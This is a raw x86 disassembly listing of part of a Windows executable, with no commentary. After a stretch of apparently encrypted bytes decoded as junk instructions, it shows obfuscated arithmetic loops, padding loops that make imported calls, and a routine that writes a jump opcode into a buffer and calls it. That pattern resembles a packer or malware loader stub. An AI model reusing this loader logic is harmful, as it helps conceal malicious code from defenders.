  416af2:	pop    ss
  416af3:	cs jbe 0x416aa5
  416af6:	cmp    esi,DWORD PTR [edx+0x5f]
  416af9:	mov    ds:0x1d481dfa,al
  416afe:	hlt    
  416aff:	xor    bh,bl
  416b01:	add    ebp,DWORD PTR [eax+edx*1+0x26c3c66c]
  416b08:	inc    eax
  416b09:	mov    bl,0x89
  416b0b:	enter  0x2da,0x4b
  416b0f:	push   ss
  416b10:	sbb    eax,eax
  416b12:	fcomp  DWORD PTR [ebx-0x23]
  416b15:	and    esi,DWORD PTR [di-0x519]
  416b1a:	cmp    bh,BYTE PTR [esi+ebx*2]
  416b1d:	lds    ebx,FWORD PTR [eax-0x49]
  416b20:	inc    eax
  416b21:	sbb    al,0x63
  416b23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b24:	outs   dx,BYTE PTR ds:[esi]
  416b25:	or     eax,0xfa51d6c0
  416b2a:	jmp    0xc7192cc0
  416b2f:	out    0x85,eax
  416b31:	mov    BYTE PTR [edx],cl
  416b33:	and    al,0x18
  416b35:	adc    BYTE PTR [edx-0x403581d2],dh
  416b3b:	int3   
  416b3c:	popf   
  416b3d:	add    ah,BYTE PTR [ebx]
  416b3f:	cld    
  416b40:	cdq    
  416b41:	inc    ecx
  416b42:	jns    0x416b12
  416b44:	sub    BYTE PTR [edx-0x3],0x9
  416b48:	test   DWORD PTR [esi+0x66],ebp
  416b4b:	cmp    BYTE PTR [ebx+0x17],ah
  416b4e:	push   ds
  416b4f:	pop    ecx
  416b50:	dec    ebp
  416b51:	mov    dl,0x8
  416b53:	inc    esp
  416b54:	sub    BYTE PTR [edx-0xb],bl
  416b57:	mov    dh,0xb3
  416b59:	int3   
  416b5a:	or     DWORD PTR [edi],edi
  416b5c:	in     eax,dx
  416b5d:	pusha  
  416b5e:	mov    eax,0xe96a9014
  416b63:	inc    esi
  416b64:	dec    ebp
  416b65:	mov    ch,0x95
  416b67:	or     bh,dl
  416b69:	ins    DWORD PTR es:[edi],dx
  416b6a:	adc    eax,0x1115cad
  416b6f:	in     eax,0x2b
  416b71:	jecxz  0x416b5e
  416b73:	mov    dh,0x92
  416b75:	call   DWORD PTR [ebx+ecx*1]
  416b78:	dec    eax
  416b79:	cmp    DWORD PTR [esi+ecx*4+0x6b],eax
  416b7d:	shl    DWORD PTR [edx],0xc4
  416b80:	fistp  DWORD PTR [edi-0x3e421847]
  416b86:	scas   al,BYTE PTR es:[edi]
  416b87:	push   edx
  416b88:	jp     0x416b74
  416b8a:	or     DWORD PTR [ebx-0x51],eax
  416b8d:	inc    ebx
  416b8e:	(bad)  
  416b90:	xor    DWORD PTR [eax-0x80],esi
  416b93:	xchg   esp,eax
  416b94:	pop    ss
  416b95:	stos   BYTE PTR es:[edi],al
  416b96:	lods   al,BYTE PTR ds:[esi]
  416b97:	dec    ecx
  416b98:	push   edx
  416b99:	xor    al,ch
  416b9b:	sahf   
  416b9c:	fld    QWORD PTR [edi+0x694c5c2b]
  416ba2:	(bad)
  416ba5:	call   0x1262871b
  416baa:	inc    ebx
  416bab:	arpl   WORD PTR [eax-0x69c26f3],di
  416bb1:	xchg   ebx,eax
  416bb2:	cmp    eax,0x1b6dbfdf
  416bb7:	mov    bh,0x61
  416bb9:	mov    edi,0xce2bbd44
  416bbe:	fsub   DWORD PTR [ebx-0x3a]
  416bc1:	scas   al,BYTE PTR es:[edi]
  416bc2:	(bad)  
  416bc3:	jl     0x416b9e
  416bc5:	stos   DWORD PTR es:[edi],eax
  416bc6:	pop    ss
  416bc7:	(bad)  
  416bc8:	mov    DWORD PTR [edx],0x54328922
  416bce:	or     al,0xbd
  416bd0:	lods   al,BYTE PTR ds:[esi]
  416bd1:	push   ecx
  416bd2:	int3   
  416bd3:	je     0x416c40
  416bd5:	sbb    DWORD PTR [edi-0x46ab9cc],0xfffffffa
  416bdc:	cmp    bl,BYTE PTR [edi-0x6a]
  416bdf:	jbe    0x416be1
  416be1:	cdq    
  416be2:	mov    edi,0x9e1e5001
  416be7:	inc    ebx
  416be8:	fmulp  st(6),st
  416bea:	mov    ch,0xe7
  416bec:	mov    ds:0x22499a03,eax
  416bf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bf2:	sub    DWORD PTR [edx],0x9c0af12f
  416bf8:	add    cl,BYTE PTR [esi-0x3b]
  416bfb:	test   BYTE PTR [ebp-0x67],bl
  416bfe:	call   0xde141252
  416c03:	inc    esp
  416c04:	sub    cl,bl
  416c06:	scas   al,BYTE PTR es:[edi]
  416c07:	add    BYTE PTR [edx+0x28],cl
  416c0a:	and    edi,eax
  416c0c:	dec    esp
  416c0d:	or     al,BYTE PTR [ebx-0x6009f57]
  416c13:	xchg   ebx,eax
  416c14:	shl    BYTE PTR [esi+0x54],0x91
  416c18:	daa    
  416c19:	lock arpl bp,bp
  416c1c:	ss retf 
  416c1e:	mov    BYTE PTR [ebx+0x51],bl
  416c21:	int    0x9d
  416c23:	sub    eax,0x80f0bea2
  416c28:	xor    ch,bl
  416c2a:	icebp  
  416c2b:	dec    edx
  416c2c:	shl    DWORD PTR [ebx-0x11],1
  416c2f:	sahf   
  416c30:	outs   dx,BYTE PTR ds:[esi]
  416c31:	leave  
  416c32:	ret    0xe605
  416c35:	aaa    
  416c36:	pop    ds
  416c37:	sar    ch,1
  416c39:	jae    0x416c35
  416c3b:	arpl   bx,si
  416c3d:	lods   eax,DWORD PTR ds:[esi]
  416c3e:	adc    ebp,esi
  416c40:	clc    
  416c41:	sub    eax,0xbb8ae18e
  416c46:	sbb    esp,DWORD PTR [ebp-0x42]
  416c49:	mov    esp,0xe1e4b8f7
  416c4e:	sub    edi,eax
  416c50:	(bad)
  416c54:	int    0xee
  416c56:	call   0xc632a752
  416c5b:	ins    BYTE PTR es:[edi],dx
  416c5c:	inc    ebx
  416c5d:	mov    bh,0x25
  416c5f:	dec    ebx
  416c60:	repz test BYTE PTR [ecx],bl
  416c63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c64:	(bad)  
  416c65:	loope  0x416c76
  416c67:	fldlg2 
  416c69:	stos   DWORD PTR es:[edi],eax
  416c6a:	push   esi
  416c6b:	bound  esi,QWORD PTR [eax]
  416c6d:	sub    DWORD PTR [edx-0x38a004f0],ebx
  416c73:	fist   DWORD PTR [eax+0x51eb693a]
  416c79:	dec    esp
  416c7a:	scas   eax,DWORD PTR es:[edi]
  416c7b:	mov    bl,0x3a
  416c7d:	out    0x12,eax
  416c7f:	fwait
  416c80:	push   esi
  416c81:	out    0x94,al
  416c83:	dec    ebx
  416c84:	mov    ebx,0x2e9d1fa9
  416c89:	dec    ebp
  416c8a:	loop   0x416d07
  416c8c:	gs nop
  416c8e:	pop    esp
  416c8f:	scas   eax,DWORD PTR es:[edi]
  416c90:	aas    
  416c91:	ret    0x3fee
  416c94:	mov    ?,WORD PTR [edi]
  416c96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c97:	adc    ah,BYTE PTR [edx]
  416c99:	fidiv  WORD PTR [eax]
  416c9b:	push   ecx
  416c9c:	push   esi
  416c9d:	mov    esi,DWORD PTR [ecx-0x2cca4a9a]
  416ca3:	jmp    0xe3d:0x3c4f4d4f
  416caa:	(bad)  
  416cab:	shl    DWORD PTR [esi+0x19],cl
  416cae:	pop    ecx
  416caf:	pop    esp
  416cb0:	push   esp
  416cb1:	jl     0x416cb5
  416cb3:	enter  0x544c,0x1d
  416cb7:	hlt    
  416cb8:	addr16 pop ds
  416cba:	cdq    
  416cbb:	jbe    0x416c5e
  416cbd:	outs   dx,DWORD PTR ds:[esi]
  416cbe:	add    edi,edx
  416cc0:	(bad)  
  416cc2:	push   ecx
  416cc3:	pop    ds
  416cc4:	arpl   WORD PTR [eax-0x5a],dx
  416cc7:	lods   eax,DWORD PTR ds:[esi]
  416cc8:	jnp    0x416c5e
  416cca:	sbb    bh,BYTE PTR [ebx-0xc]
  416ccd:	inc    esp
  416cce:	ja     0x416cb5
  416cd0:	in     eax,0x8b
  416cd2:	pop    ebp
  416cd3:	clc    
  416cd4:	xor    edx,eax
  416cd6:	xor    ebx,eax
  416cd8:	sub    edx,ebx
  416cda:	sub    edx,esi
  416cdc:	xor    edx,eax
  416cde:	mov    DWORD PTR [ebp+0x8],edx
  416ce1:	mov    edx,DWORD PTR [ebp+0x8]
  416ce4:	mov    ebx,DWORD PTR [ebp-0x58]
  416ce7:	lea    edx,[ebx+edx*1+0x5708f4]
  416cee:	mov    DWORD PTR [ebp-0x58],edx
  416cf1:	mov    edx,DWORD PTR [ebp+0x8]
  416cf4:	mov    ebx,DWORD PTR [ebp-0x54]
  416cf7:	add    edx,0x64f89a
  416cfd:	imul   edx,ebx
  416d00:	mov    DWORD PTR [ebp-0x54],edx
  416d03:	mov    edx,DWORD PTR [ebp+0x8]
  416d06:	mov    ebx,DWORD PTR [ebp-0x50]
  416d09:	add    edx,0x242ebe9
  416d0f:	and    edx,ebx
  416d11:	mov    DWORD PTR [ebp-0x50],edx
  416d14:	mov    edx,DWORD PTR [ebp+0x8]
  416d17:	mov    ebx,DWORD PTR [ebp-0x4c]
  416d1a:	add    edx,ecx
  416d1c:	or     edx,ebx
  416d1e:	mov    DWORD PTR [ebp-0x4c],edx
  416d21:	mov    edx,DWORD PTR [ebp+0x8]
  416d24:	mov    ebx,0xfdbe0321
  416d29:	sub    ebx,edx
  416d2b:	add    ebx,DWORD PTR [ebp-0x48]
  416d2e:	mov    DWORD PTR [ebp-0x48],ebx
  416d31:	mov    edx,DWORD PTR [ebp+0x8]
  416d34:	mov    ebx,DWORD PTR [ebp-0x44]
  416d37:	add    edx,edi
  416d39:	xor    edx,ebx
  416d3b:	mov    DWORD PTR [ebp-0x44],edx
  416d3e:	mov    edx,DWORD PTR [ebp+0x8]
  416d41:	xor    edx,eax
  416d43:	add    edx,esi
  416d45:	jne    0x41497b
  416d4b:	jmp    0x416dd8
  416d50:	mov    edx,DWORD PTR [ebp-0x14]
  416d53:	mov    DWORD PTR [ebp+0x8],edx
  416d56:	jmp    0x416dcb
  416d5b:	mov    edx,DWORD PTR [ebp+0x8]
  416d5e:	mov    ebx,DWORD PTR [ebp-0x8]
  416d61:	xor    edx,eax
  416d63:	xor    ebx,eax
  416d65:	sub    edx,ebx
  416d67:	sub    edx,esi
  416d69:	xor    edx,eax
  416d6b:	mov    DWORD PTR [ebp+0x8],edx
  416d6e:	mov    edx,DWORD PTR [ebp+0x8]
  416d71:	mov    ebx,DWORD PTR [ebp-0x58]
  416d74:	lea    edx,[ebx+edx*1+0x5708f4]
  416d7b:	mov    DWORD PTR [ebp-0x58],edx
  416d7e:	mov    edx,DWORD PTR [ebp+0x8]
  416d81:	mov    ebx,DWORD PTR [ebp-0x54]
  416d84:	add    edx,0x64f89a
  416d8a:	imul   edx,ebx
  416d8d:	mov    DWORD PTR [ebp-0x54],edx
  416d90:	mov    edx,DWORD PTR [ebp+0x8]
  416d93:	mov    ebx,DWORD PTR [ebp-0x50]
  416d96:	add    edx,0x242ebe9
  416d9c:	and    edx,ebx
  416d9e:	mov    DWORD PTR [ebp-0x50],edx
  416da1:	mov    edx,DWORD PTR [ebp+0x8]
  416da4:	mov    ebx,DWORD PTR [ebp-0x4c]
  416da7:	add    edx,ecx
  416da9:	or     edx,ebx
  416dab:	mov    DWORD PTR [ebp-0x4c],edx
  416dae:	mov    edx,DWORD PTR [ebp+0x8]
  416db1:	mov    ebx,0xfdbe0321
  416db6:	sub    ebx,edx
  416db8:	add    ebx,DWORD PTR [ebp-0x48]
  416dbb:	mov    DWORD PTR [ebp-0x48],ebx
  416dbe:	mov    edx,DWORD PTR [ebp+0x8]
  416dc1:	mov    ebx,DWORD PTR [ebp-0x44]
  416dc4:	add    edx,edi
  416dc6:	xor    edx,ebx
  416dc8:	mov    DWORD PTR [ebp-0x44],edx
  416dcb:	mov    edx,DWORD PTR [ebp+0x8]
  416dce:	xor    edx,eax
  416dd0:	add    edx,esi
  416dd2:	jne    0x416d5b
  416dd8:	mov    edx,DWORD PTR [ebp-0x14]
  416ddb:	mov    DWORD PTR [ebp+0x8],edx
  416dde:	jmp    0x416e53
  416de3:	mov    edx,DWORD PTR [ebp+0x8]
  416de6:	mov    ebx,DWORD PTR [ebp-0x8]
  416de9:	xor    edx,eax
  416deb:	xor    ebx,eax
  416ded:	sub    edx,ebx
  416def:	sub    edx,esi
  416df1:	xor    edx,eax
  416df3:	mov    DWORD PTR [ebp+0x8],edx
  416df6:	mov    edx,DWORD PTR [ebp+0x8]
  416df9:	mov    ebx,DWORD PTR [ebp-0x58]
  416dfc:	lea    edx,[ebx+edx*1+0x5708f4]
  416e03:	mov    DWORD PTR [ebp-0x58],edx
  416e06:	mov    edx,DWORD PTR [ebp+0x8]
  416e09:	mov    ebx,DWORD PTR [ebp-0x54]
  416e0c:	add    edx,0x64f89a
  416e12:	imul   edx,ebx
  416e15:	mov    DWORD PTR [ebp-0x54],edx
  416e18:	mov    edx,DWORD PTR [ebp+0x8]
  416e1b:	mov    ebx,DWORD PTR [ebp-0x50]
  416e1e:	add    edx,0x242ebe9
  416e24:	and    edx,ebx
  416e26:	mov    DWORD PTR [ebp-0x50],edx
  416e29:	mov    edx,DWORD PTR [ebp+0x8]
  416e2c:	mov    ebx,DWORD PTR [ebp-0x4c]
  416e2f:	add    edx,ecx
  416e31:	or     edx,ebx
  416e33:	mov    DWORD PTR [ebp-0x4c],edx
  416e36:	mov    edx,DWORD PTR [ebp+0x8]
  416e39:	mov    ebx,0xfdbe0321
  416e3e:	sub    ebx,edx
  416e40:	add    ebx,DWORD PTR [ebp-0x48]
  416e43:	mov    DWORD PTR [ebp-0x48],ebx
  416e46:	mov    edx,DWORD PTR [ebp+0x8]
  416e49:	mov    ebx,DWORD PTR [ebp-0x44]
  416e4c:	add    edx,edi
  416e4e:	xor    edx,ebx
  416e50:	mov    DWORD PTR [ebp-0x44],edx
  416e53:	mov    edx,DWORD PTR [ebp+0x8]
  416e56:	xor    edx,eax
  416e58:	add    edx,esi
  416e5a:	jne    0x416de3
  416e60:	mov    edx,DWORD PTR [ebp-0x8]
  416e63:	mov    ebx,DWORD PTR [ebp-0xc]
  416e66:	xor    edx,eax
  416e68:	lea    edx,[edx+ebx*1+0x3272fa]
  416e6f:	mov    DWORD PTR [ebp-0xc],edx
  416e72:	mov    edx,DWORD PTR [ebp-0x10]
  416e75:	xor    edx,eax
  416e77:	add    edx,esi
  416e79:	jne    0x412518
  416e7f:	jmp    0x416f96
  416e84:	mov    ecx,DWORD PTR [ebp-0x14]
  416e87:	mov    DWORD PTR [ebp+0x8],ecx
  416e8a:	jmp    0x416f03
  416e8f:	mov    ecx,DWORD PTR [ebp+0x8]
  416e92:	mov    edx,DWORD PTR [ebp-0x8]
  416e95:	xor    ecx,eax
  416e97:	xor    edx,eax
  416e99:	sub    ecx,edx
  416e9b:	sub    ecx,esi
  416e9d:	xor    ecx,eax
  416e9f:	mov    DWORD PTR [ebp+0x8],ecx
  416ea2:	mov    ecx,DWORD PTR [ebp+0x8]
  416ea5:	mov    edx,DWORD PTR [ebp-0x58]
  416ea8:	lea    ecx,[edx+ecx*1+0x5708f4]
  416eaf:	mov    DWORD PTR [ebp-0x58],ecx
  416eb2:	mov    ecx,DWORD PTR [ebp+0x8]
  416eb5:	mov    edx,DWORD PTR [ebp-0x54]
  416eb8:	add    ecx,0x64f89a
  416ebe:	imul   ecx,edx
  416ec1:	mov    DWORD PTR [ebp-0x54],ecx
  416ec4:	mov    ecx,DWORD PTR [ebp+0x8]
  416ec7:	mov    edx,DWORD PTR [ebp-0x50]
  416eca:	add    ecx,0x242ebe9
  416ed0:	and    ecx,edx
  416ed2:	mov    DWORD PTR [ebp-0x50],ecx
  416ed5:	mov    ecx,DWORD PTR [ebp+0x8]
  416ed8:	mov    edx,DWORD PTR [ebp-0x4c]
  416edb:	add    ecx,0xf641bea
  416ee1:	or     ecx,edx
  416ee3:	mov    DWORD PTR [ebp-0x4c],ecx
  416ee6:	mov    ecx,DWORD PTR [ebp+0x8]
  416ee9:	mov    edx,0xfdbe0321
  416eee:	sub    edx,ecx
  416ef0:	add    edx,DWORD PTR [ebp-0x48]
  416ef3:	mov    DWORD PTR [ebp-0x48],edx
  416ef6:	mov    ecx,DWORD PTR [ebp+0x8]
  416ef9:	mov    edx,DWORD PTR [ebp-0x44]
  416efc:	add    ecx,edi
  416efe:	xor    ecx,edx
  416f00:	mov    DWORD PTR [ebp-0x44],ecx
  416f03:	mov    ecx,DWORD PTR [ebp+0x8]
  416f06:	xor    ecx,eax
  416f08:	add    ecx,esi
  416f0a:	jne    0x416e8f
  416f10:	jmp    0x416fa2
  416f15:	mov    ecx,DWORD PTR [ebp+0x8]
  416f18:	mov    edx,DWORD PTR [ebp-0x8]
  416f1b:	xor    ecx,eax
  416f1d:	xor    edx,eax
  416f1f:	sub    ecx,edx
  416f21:	sub    ecx,esi
  416f23:	xor    ecx,eax
  416f25:	mov    DWORD PTR [ebp+0x8],ecx
  416f28:	mov    ecx,DWORD PTR [ebp+0x8]
  416f2b:	mov    edx,DWORD PTR [ebp-0x58]
  416f2e:	lea    ecx,[edx+ecx*1+0x5708f4]
  416f35:	mov    DWORD PTR [ebp-0x58],ecx
  416f38:	mov    ecx,DWORD PTR [ebp+0x8]
  416f3b:	mov    edx,DWORD PTR [ebp-0x54]
  416f3e:	add    ecx,0x64f89a
  416f44:	imul   ecx,edx
  416f47:	mov    DWORD PTR [ebp-0x54],ecx
  416f4a:	mov    ecx,DWORD PTR [ebp+0x8]
  416f4d:	mov    edx,DWORD PTR [ebp-0x50]
  416f50:	add    ecx,0x242ebe9
  416f56:	and    ecx,edx
  416f58:	mov    DWORD PTR [ebp-0x50],ecx
  416f5b:	mov    ecx,DWORD PTR [ebp+0x8]
  416f5e:	mov    edx,DWORD PTR [ebp-0x4c]
  416f61:	add    ecx,0xf641bea
  416f67:	or     ecx,edx
  416f69:	mov    DWORD PTR [ebp-0x4c],ecx
  416f6c:	mov    ecx,DWORD PTR [ebp+0x8]
  416f6f:	mov    edx,0xfdbe0321
  416f74:	sub    edx,ecx
  416f76:	add    edx,DWORD PTR [ebp-0x48]
  416f79:	mov    DWORD PTR [ebp-0x48],edx
  416f7c:	mov    ecx,DWORD PTR [ebp+0x8]
  416f7f:	mov    edx,DWORD PTR [ebp-0x44]
  416f82:	add    ecx,edi
  416f84:	xor    ecx,edx
  416f86:	mov    DWORD PTR [ebp-0x44],ecx
  416f89:	mov    ecx,DWORD PTR [ebp+0x8]
  416f8c:	xor    ecx,eax
  416f8e:	add    ecx,esi
  416f90:	jne    0x416f15
  416f96:	mov    ecx,DWORD PTR [ebp-0x8]
  416f99:	xor    ecx,eax
  416f9b:	mov    eax,DWORD PTR [ebp+0x10]
  416f9e:	add    ecx,esi
  416fa0:	mov    DWORD PTR [eax],ecx
  416fa2:	pop    edi
  416fa3:	pop    esi
  416fa4:	pop    ebx
  416fa5:	leave  
  416fa6:	ret    0xc
  416fa9:	push   ebp
  416faa:	mov    ebp,esp
  416fac:	sub    esp,0x78
  416faf:	add    DWORD PTR ds:0x426f25,0x66eb
  416fb9:	push   esi
  416fba:	mov    esi,DWORD PTR ds:0x426f55
  416fc0:	mov    eax,ds:0x428e51
  416fc5:	sub    eax,esi
  416fc7:	imul   esi,DWORD PTR [esi+eax*1]
  416fcb:	push   edi
  416fcc:	xor    esi,esi
  416fce:	or     esi,DWORD PTR ds:0x42af15
  416fd4:	mov    esi,DWORD PTR [esi]
  416fd6:	sbb    DWORD PTR ds:0x426e8d,esi
  416fdc:	mov    eax,ds:0x4262c9
  416fe1:	mov    DWORD PTR [ebp-0x24],eax
  416fe4:	and    DWORD PTR ds:0x426eb9,0x0
  416fee:	mov    esi,DWORD PTR ds:0x426eb9
  416ff4:	inc    esi
  416ff5:	mov    DWORD PTR ds:0x426eb9,esi
  416ffb:	cmp    DWORD PTR ds:0x426eb9,0x4
  417002:	jbe    0x41703f
  417008:	jmp    0x417018
  41700d:	push   0x2f87
  417012:	call   DWORD PTR ds:0x42fa2c
  417018:	cmp    DWORD PTR ds:0x426eb9,0x3
  41701f:	jne    0x417032
  417025:	mov    esi,DWORD PTR ds:0x426eb9
  41702b:	inc    esi
  41702c:	mov    DWORD PTR ds:0x426eb9,esi
  417032:	cmp    DWORD PTR ds:0x426eb9,0x19
  417039:	jb     0x416fee
  41703f:	mov    eax,ds:0x4263e9
  417044:	mov    DWORD PTR [ebp-0x30],eax
  417047:	sub    esi,esi
  417049:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  417050:	mov    DWORD PTR [ebp-0x28],0xf89c85b4
  417057:	and    DWORD PTR ds:0x426ec1,0x0
  417061:	jmp    0x417074
  417066:	xor    eax,eax
  417068:	add    eax,DWORD PTR ds:0x426ec1
  41706e:	inc    eax
  41706f:	mov    ds:0x426ec1,eax
  417074:	cmp    DWORD PTR ds:0x426ec1,0x13
  41707b:	jae    0x4170b9
  417081:	cmp    DWORD PTR ds:0x426ec1,0x5
  417088:	jg     0x4170b9
  41708e:	jmp    0x417099
  417093:	call   DWORD PTR ds:0x42fa00
  417099:	cmp    DWORD PTR ds:0x426ec1,0x4
  4170a0:	jne    0x4170b4
  4170a6:	xor    eax,eax
  4170a8:	xor    eax,DWORD PTR ds:0x426ec1
  4170ae:	inc    eax
  4170af:	mov    ds:0x426ec1,eax
  4170b4:	jmp    0x417066
  4170b9:	mov    eax,DWORD PTR [ebp-0x10]
  4170bc:	mov    ecx,DWORD PTR [ebp-0x10]
  4170bf:	sub    eax,ecx
  4170c1:	mov    ecx,DWORD PTR ds:0x428e5d
  4170c7:	mov    ecx,DWORD PTR [ecx]
  4170c9:	and    DWORD PTR ds:0x426ed5,ecx
  4170cf:	mov    DWORD PTR [ebp-0x10],eax
  4170d2:	and    DWORD PTR ds:0x426ec1,0x0
  4170dc:	xor    ecx,ecx
  4170de:	or     ecx,DWORD PTR ds:0x426ec1
  4170e4:	inc    ecx
  4170e5:	mov    DWORD PTR ds:0x426ec1,ecx
  4170eb:	cmp    DWORD PTR ds:0x426ec1,0x8
  4170f2:	ja     0x417153
  4170f8:	jmp    0x41712c
  4170fd:	push   0x4411
  417102:	push   DWORD PTR [ebp-0x28]
  417105:	push   0x7cba
  41710a:	push   0x1619
  41710f:	push   DWORD PTR [ebp-0x28]
  417112:	push   0x5e18
  417117:	push   0x6c27
  41711c:	push   0x15fe
  417121:	push   0x4181
  417126:	call   DWORD PTR ds:0x42fa04
  41712c:	cmp    DWORD PTR ds:0x426ec1,0x7
  417133:	jne    0x417146
  417139:	mov    ecx,DWORD PTR ds:0x426ec1
  41713f:	inc    ecx
  417140:	mov    DWORD PTR ds:0x426ec1,ecx
  417146:	cmp    DWORD PTR ds:0x426ec1,0x1b
  41714d:	jb     0x4170dc
  417153:	xor    DWORD PTR [ebp-0x10],0xf89cb5b5
  41715a:	mov    edi,DWORD PTR ds:0x426e95
  417160:	xor    DWORD PTR ds:0x426e91,edi
  417166:	mov    eax,DWORD PTR [ebp-0x18]
  417169:	mov    DWORD PTR ds:0x426e89,0x1f
  417173:	cmp    DWORD PTR ds:0x426e89,0x0
  41717a:	je     0x4171aa
  417180:	cmp    DWORD PTR ds:0x426e89,0x28
  417187:	jg     0x4171aa
  41718d:	jmp    0x417198
  417192:	call   DWORD PTR ds:0x42fa38
  417198:	mov    esi,DWORD PTR ds:0x426e89
  41719e:	dec    esi
  41719f:	mov    DWORD PTR ds:0x426e89,esi
  4171a5:	jmp    0x417173
  4171aa:	mov    ecx,DWORD PTR [ebp-0x18]
  4171ad:	sbb    DWORD PTR ds:0x426e91,ebx
  4171b3:	sub    eax,ecx
  4171b5:	mov    DWORD PTR [ebp-0x18],eax
  4171b8:	sbb    ecx,DWORD PTR ds:0x426ed5
  4171be:	or     DWORD PTR [ebp-0x18],0xf89f05b5
  4171c5:	mov    eax,DWORD PTR [ebp-0xc]
  4171c8:	mov    ecx,DWORD PTR [ebp-0xc]
  4171cb:	adc    DWORD PTR ds:0x426eed,0xa48
  4171d5:	sub    eax,ecx
  4171d7:	mov    DWORD PTR [ebp-0xc],eax
  4171da:	or     DWORD PTR [ebp-0xc],0xf89c85f5
  4171e1:	mov    DWORD PTR ds:0x426eb9,0x1e
  4171eb:	cmp    DWORD PTR ds:0x426eb9,0x0
  4171f2:	je     0x417222
  4171f8:	cmp    DWORD PTR ds:0x426eb9,0x24
  4171ff:	jb     0x417222
  417205:	jmp    0x417210
  41720a:	call   DWORD PTR ds:0x42fa08
  417210:	mov    esi,DWORD PTR ds:0x426eb9
  417216:	dec    esi
  417217:	mov    DWORD PTR ds:0x426eb9,esi
  41721d:	jmp    0x4171eb
  417222:	mov    eax,DWORD PTR [ebp-0x1c]
  417225:	mov    ecx,DWORD PTR [ebp-0x1c]
  417228:	sub    eax,ecx
  41722a:	mov    DWORD PTR [ebp-0x1c],eax
  41722d:	or     DWORD PTR [ebp-0x1c],0xf89c8595
  417234:	mov    eax,DWORD PTR [ebp-0x20]
  417237:	mov    ecx,DWORD PTR [ebp-0x20]
  41723a:	sub    eax,ecx
  41723c:	mov    DWORD PTR [ebp-0x20],eax
  41723f:	mov    eax,DWORD PTR [ebp-0x2c]
  417242:	mov    ecx,DWORD PTR [ebp-0x20]
  417245:	mov    esi,0x75108b3
  41724a:	xor    eax,esi
  41724c:	mov    edi,0x3272fa
  417251:	add    eax,edi
  417253:	or     eax,ecx
  417255:	mov    DWORD PTR [ebp-0x20],eax
  417258:	mov    eax,DWORD PTR [ebp-0x4]
  41725b:	mov    ecx,DWORD PTR [ebp-0x4]
  41725e:	sub    eax,ecx
  417260:	mov    DWORD PTR [ebp-0x4],eax
  417263:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  41726a:	mov    eax,DWORD PTR [ebp-0xc]
  41726d:	xor    eax,esi
  41726f:	add    eax,edi
  417271:	push   eax
  417272:	mov    eax,DWORD PTR [ebp-0x10]
  417275:	xor    eax,esi
  417277:	add    eax,edi
  417279:	push   eax
  41727a:	mov    eax,DWORD PTR [ebp-0x4]
  41727d:	xor    eax,esi
  41727f:	add    eax,0x3272fe
  417284:	push   eax
  417285:	lea    eax,[ebp-0x78]
  417288:	push   eax
  417289:	push   DWORD PTR [ebp-0x2c]
  41728c:	push   DWORD PTR [ebp-0x28]
  41728f:	call   0x40d3b8
  417294:	test   eax,eax
  417296:	je     0x4172c4
  41729c:	lea    eax,[ebp-0x78]
  41729f:	push   eax
  4172a0:	mov    eax,DWORD PTR [ebp-0x28]
  4172a3:	xor    eax,esi
  4172a5:	add    eax,edi
  4172a7:	push   eax
  4172a8:	mov    eax,DWORD PTR [ebp-0x24]
  4172ab:	add    eax,0xaa
  4172b0:	push   eax
  4172b1:	mov    eax,DWORD PTR [ebp-0x24]
  4172b4:	mov    eax,DWORD PTR [eax+0x198]
  4172ba:	push   DWORD PTR [eax]
  4172bc:	call   0x408594
  4172c1:	mov    DWORD PTR [ebp-0x14],eax
  4172c4:	mov    ecx,DWORD PTR ds:0x4263c1
  4172ca:	lea    eax,[ebp+0x4]
  4172cd:	mov    DWORD PTR [ecx*4+0x4263b9],eax
  4172d4:	inc    DWORD PTR ds:0x4263c1
  4172da:	mov    eax,DWORD PTR [ebp-0x14]
  4172dd:	test   eax,eax
  4172df:	je     0x417351
  4172e5:	lea    eax,[ebp-0x8]
  4172e8:	mov    DWORD PTR [ebp-0x34],eax
  4172eb:	mov    eax,DWORD PTR [ebp-0x30]
  4172ee:	mov    DWORD PTR [ebp-0x8],eax
  4172f1:	mov    eax,DWORD PTR [ebp-0x8]
  4172f4:	mov    ecx,DWORD PTR [ebp-0x14]
  4172f7:	sub    eax,ecx
  4172f9:	mov    DWORD PTR [ebp-0x8],eax
  4172fc:	mov    ecx,DWORD PTR [ebp-0x4]
  4172ff:	xor    ecx,esi
  417301:	mov    eax,0xffcd8d06
  417306:	sub    eax,ecx
  417308:	add    DWORD PTR [ebp-0x8],eax
  41730b:	mov    eax,DWORD PTR [ebp-0x14]
  41730e:	mov    DWORD PTR [eax],0x675565e9
  417314:	mov    DWORD PTR [eax+0x4],0x76576787
  41731b:	mov    eax,DWORD PTR [ebp-0x8]
  41731e:	mov    ecx,DWORD PTR [ebp-0x14]
  417321:	push   DWORD PTR [ebp-0x24]
  417324:	mov    DWORD PTR [ecx+0x1],eax
  417327:	mov    eax,ds:0x426145
  41732c:	push   DWORD PTR [eax]
  41732e:	push   DWORD PTR ds:0x4263a9
  417334:	push   DWORD PTR ds:0x42614d
  41733a:	push   DWORD PTR ds:0x426389
  417340:	push   DWORD PTR ds:0x426cc9
  417346:	push   DWORD PTR [ebp-0x28]
  417349:	push   DWORD PTR [ebp-0x2c]
  41734c:	mov    eax,DWORD PTR [ebp-0x14]
  41734f:	call   eax
  417351:	pop    edi
  417352:	pop    esi
  417353:	leave  
  417354:	ret    
  417355:	push   ebp
  417356:	mov    ebp,esp
  417358:	sub    esp,0x34
  41735b:	neg    edx
  41735d:	push   ebx
  41735e:	adc    edx,ecx
  417360:	push   esi
  417361:	push   edi
  417362:	xor    ecx,0x2a8a
  417368:	mov    DWORD PTR [ebp-0x10],0xf89f85b5
  41736f:	mov    edx,DWORD PTR ds:0x429eb1
  417375:	xor    esi,esi
  417377:	xor    esi,DWORD PTR ds:0x429ec5
  41737d:	sub    esi,edx
  41737f:	add    edx,DWORD PTR [edx+esi*1]
  417382:	lea    eax,[ebp+0x14]
  417385:	sub    ecx,0x2a97
  41738b:	mov    DWORD PTR [ebp-0x4],eax
  41738e:	sub    DWORD PTR ds:0x426e8d,0x3cd0
  417398:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
